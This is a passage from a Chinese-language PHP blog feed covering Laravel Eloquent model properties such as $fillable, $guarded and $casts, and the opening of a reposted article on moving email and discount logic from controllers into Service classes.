id="CREATED-AT-UPDATED-AT"><a href="#CREATED-AT-UPDATED-AT" class="headerlink" title="CREATED_AT|UPDATED_AT"></a>CREATED_AT|UPDATED_AT</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义存储时间戳的字段名</span></span><br><span class="line"><span class="keyword">const</span> CREATED_AT = <span class="string">'start_time'</span>;</span><br><span class="line"><span class="keyword">const</span> UPDATED_AT = <span class="string">'end_time'</span>;</span><br></pre></td></tr></table></figure><h3 id="dateFormat"><a href="#dateFormat" class="headerlink" title="dateFormat"></a>dateFormat</h3><p>如果需要自定义时间戳的格式，在你的模型中设置 $dateFormat 属性。这个属性决定日期属性在数据库的存储方式，以及模型序列化为数组或者 JSON 的格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 模型日期的存储格式</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $dateFormat = <span class="string">'U'</span>;</span><br></pre></td></tr></table></figure><p>不清楚 U 是什么意思的，请看 <a href="http://php.net/manual/zh/function.date.php" target="_blank" rel="noopener">Date/Time 函数</a> 。</p><h3 id="attributes"><a href="#attributes" class="headerlink" title="attributes"></a>attributes</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 模型属性的默认值</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $attributes = [</span><br><span class="line">    <span class="string">'delayed'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h3 id="hidden"><a href="#hidden" class="headerlink" title="hidden"></a>hidden</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 隐藏以下字段</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $hidden = [<span class="string">'password'</span>];</span><br></pre></td></tr></table></figure><h3 id="visible"><a href="#visible" class="headerlink" title="visible"></a>visible</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 显示以下字段</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $visible = [<span class="string">'first_name'</span>, <span class="string">'last_name'</span>];</span><br></pre></td></tr></table></figure><p>如果说<code>$hidden</code> 属性是黑名单，那么<code>$visible</code> 就是白名单。</p><h3 id="fillable"><a href="#fillable" class="headerlink" title="fillable"></a>fillable</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 可以被批量赋值的属性</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $fillable = [<span class="string">"username"</span>];</span><br></pre></td></tr></table></figure><h3 id="guarded"><a href="#guarded" class="headerlink" title="guarded"></a>guarded</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 设定不可被批量赋值的属性，当 $guarded 为空数组时则所有属性都可以被批量赋值。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $guarded = [<span class="string">'price'</span>];</span><br></pre></td></tr></table></figure><h3 id="casts"><a href="#casts" class="headerlink" title="casts"></a>casts</h3><p><code>casts</code> 属性很有用，可以使得从数据库中获取的数据，可以自动转换成我们期望的类型。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 字段转换为对应的类型</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $casts = [</span><br><span class="line">   <span class="string">"settings"</span> =&gt; <span class="string">"array"</span>,</span><br><span class="line">   <span class="string">'created_at'</span> =&gt; <span class="string">'datetime:Y-m-d H:i:s'</span>,</span><br><span class="line">   <span class="string">'updated_at'</span> =&gt; <span class="string">'datetime:Y-m-d H:i:s'</span>,</span><br><span class="line">   <span class="string">'is_admin'</span> =&gt; <span class="string">'boolean'</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>可能的属性转换列类型：<br>|类型|描述|<br>|-|-|<br>|int<code>|</code>integer|通过 PHP 转换（int）|<br>|real<code>|</code>float<code>|</code>double|通过 PHP 转换（float）|<br>|string|通过 PHP 转换（string）|<br>|bool<code>|</code>boolean|通过 PHP 转换（bool）|<br>|object|作为一个stdClass 对象，从JSON 解析或被解析为JSON|<br>|array|作为一个数组，从JSON 解析或被解析为JSON|<br>|collection|作为一个集合，从JSON 解析或被解析为JSON|<br>|date<code>|</code>datetime|从数据库DATATIME 解析为Carbon 类型，然后返回|<br>|timestamp|数数据库TIMESTAMP 解析为Carbon 类型，然后返回|</p><h3 id="dates"><a href="#dates" class="headerlink" title="dates"></a>dates</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 需要转换成日期的属性。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $dates = [<span class="string">'deleted_at'</span>];</span><br></pre></td></tr></table></figure><h3 id="perPage"><a href="#perPage" class="headerlink" title="perPage"></a>perPage</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 默认分页数量</span><br><span class="line"> *</span><br><span class="line"> * @var int</span><br><span class="line"> *&#x2F;</span><br><span class="line">protected $perPage &#x3D; 50;</span><br></pre></td></tr></table></figure><h3 id="touches"><a href="#touches" class="headerlink" title="touches"></a>touches</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 更新关联模型的 updated_at 字段</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $touches = [<span class="string">'post'</span>];</span><br></pre></td></tr></table></figure><h3 id="dispatchesEvents"><a href="#dispatchesEvents" class="headerlink" title="dispatchesEvents"></a>dispatchesEvents</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 模型的事件映射</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $dispatchesEvents = [</span><br><span class="line">    <span class="string">'saved'</span> =&gt; UserSaved::class,</span><br><span class="line">    <span class="string">'deleted'</span> =&gt; UserDeleted::class,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h3 id="with"><a href="#with" class="headerlink" title="with"></a>with</h3><p>为关联模型默认添加『渴求式加载』，等效于使用查询构造器时，手动指定<code>with</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   *   </span></span><br><span class="line"><span class="comment">   * <span class="doctag">@var</span> string[] </span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">protected</span> $with = [</span><br><span class="line">      <span class="string">"topics"</span>,</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">topics</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hasMany(Topic::class);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://learnku.com/docs/laravel/8.x/eloquent/9406#e45381" target="_blank" rel="noopener">Eloquent ORM 快速入门</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Eloquent 提供了很多属性，通过对模型进行约定，可以实现很多很方便的功能。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>『转载』如何使用Service 模式</title>
    <link href="https://www.0x2beace.com/how-to-use-service-mode/"/>
    <id>https://www.0x2beace.com/how-to-use-service-mode/</id>
    <published>2021-04-12T15:22:55.000Z</published>
    <updated>2021-04-12T15:23:55.459Z</updated>
    
    <content type="html"><![CDATA[<p>若将数据库逻辑都写在 <code>Controller</code> 里，会造成 <code>Controller</code> 代码的臃肿难以维护，基于 <code>SOLID</code> 原则，我们应该使用 <code>Service</code> 模式辅助 <code>Controller</code>，将相关的业务逻辑封装在不同的 <code>Service</code>，方便项目的后期维护。</p><a id="more"></a><h2 id="商业逻辑"><a href="#商业逻辑" class="headerlink" title="商业逻辑"></a>商业逻辑</h2><p>商业逻辑中，常见的如 :</p><ol><li>牵涉到外部行为 : 如发送Email，使用外部API…</li><li>使用PHP写的逻辑 : 如根据购买的件数，有不同的折扣。</li></ol><p>若将商业逻辑写在 controller，会造成 controller 肥大，日后难以维护。</p><h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><h3 id="牵涉到外部的行为"><a href="#牵涉到外部的行为" class="headerlink" title="牵涉到外部的行为"></a>牵涉到外部的行为</h3><p>如 <code>发送Email</code>，常常会在 <code>Controller</code> 中直接调用 <code>Mail::queue()</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> \Illuminate\Http\Request $request</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">store</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    \Mail::queue(<span class="string">'email.index'</span>, $request-&gt;all(), <span class="function"><span class="keyword">function</span> <span class="params">(Message $message)</span> </span>&#123;</span><br><span class="line">        $message-&gt;sender(env(<span class="string">'MAIL_USERNAME'</span>));</span><br><span class="line">        $message-&gt;subject(env(<span class="string">'MAIL_SUBJECT'</span>));</span><br><span class="line">        $message-&gt;to(env(<span class="string">'MAIL_TO_ADDR'</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在中大型的项目中，会有几个问题：</p><ol><li>将牵涉到外部行为的逻辑写在 Controller，造成 Controller 代码臃肿难以维护</li><li>违反 SOLID 的单一职责原则：外部行为不应该写在 Controller</li><li>Controller 直接相依于外部行为，使得我们无法对 Controller 做单元测试</li></ol><p>比较好的方式是使用 Service，使用的步骤如下：</p><ol><li>将外部行为注入到 Service</li><li>在 Service 使用外部行为</li><li>将 Service 注入到 Controlelr</li></ol><p><code>app\Services\EmailService.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Mail</span>\<span class="title">Message</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Mail</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class EmailService</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Services</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EmailService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> \Mail</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $mailer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将相依的 Mailer 注入到 EmailService</span></span><br><span class="line"><span class="comment">     * EmailService constructor.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $mailer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Mail $mailer)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mailer = $mailer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 发送 Email的逻辑写在 send() 不是使用 Mail Facade，而是使用 $this-&gt;mailer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $request</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">(array $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mailer-&gt;queue(<span class="string">'email.index'</span>,$request,<span class="function"><span class="keyword">function</span><span class="params">(Message $message)</span></span>&#123;</span><br><span class="line">            $message-&gt;sender(env(<span class="string">'MAIL_USERNAME'</span>));</span><br><span class="line">            $message-&gt;subject(env(<span class="string">'MAIL_SUBJECT'</span>));</span><br><span class="line">            $message-&gt;to(env(<span class="string">'MAIL_TO_ADDR'</span>));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>app\Controllers\UserController.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">EmailService</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class UserController</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Http\Controllers</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> \App\Services\EmailService</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $emailService;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \Illuminate\Http\Request $request</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">store</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;emailService-&gt;send($request-&gt;all());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从原本相依于 <code>Mail Facade</code> ，改成相依于注入的 <code>EmailService</code>。<br>改用这种写法有几个优点，如下：</p><ol><li>将外部行为写在 Service，解决了 Controller 代码臃肿的问题。</li><li>符合 SOLID 的单一职责原则： 外部行为写在　Service ，没写在 Controller。</li><li>符合 SOLID 的依赖反转原则：Controller 并非直接相依于 Service，而是将 Service 依赖注入进 Controller。</li></ol><h3 id="使用-PHP-写的逻辑"><a href="#使用-PHP-写的逻辑" class="headerlink" title="使用 PHP 写的逻辑"></a>使用 PHP 写的逻辑</h3><p>如根据用户购买数量，给予同步的折扣，可能我们会在 Controller 直接写 <code>if () { ... } else { ... }</code> 逻辑。</p><p><code>app\Controllers\UserController.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $number = $request-&gt;input(<span class="string">'number'</span>);</span><br><span class="line">    $price = <span class="number">500</span>;</span><br><span class="line">    $discount = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ($number == <span class="number">1</span>) &#123;</span><br><span class="line">        $discount = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($number == <span class="number">2</span>) &#123;</span><br><span class="line">        $discount = <span class="number">0.9</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($number == <span class="number">3</span>) &#123;</span><br><span class="line">        $discount = <span class="number">0.8</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $discount = <span class="number">0.7</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $total = $price * $number * $discount;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $total;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在中大型项目中，会有几个问题：</p><ol><li>将 PHP 写的业务逻辑直接写在 Controller ，造成 Controller 的代码臃肿难以维护</li><li>违反了 SOLID 的单一职责原则：业务逻辑不应该写在 Controller</li><li>违反了 SOLID 的单一职责原则：若未来想要改变折扣的写算法，都需要用到此 Method，也也就是说这个 Method 同时包含了计算折扣于计算加总的职责，因此违反了 SOLID 的单一职责原则</li><li>直接写在 Controller 的逻辑无法被其他 Controller 使用</li></ol><p><code>app\Services\OrderService.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class OrderService</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Services</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 计算折扣</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $number</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> float</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getDisCount</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($number) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1.0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0.9</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0.8</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0.7</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 计算最后价格</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $number</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $discount</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTotal</span><span class="params">($number, $discount)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">500</span> * $number * $discount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Controller 中调用代码，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">OrderService</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class UserController</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Http\Controllers</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> 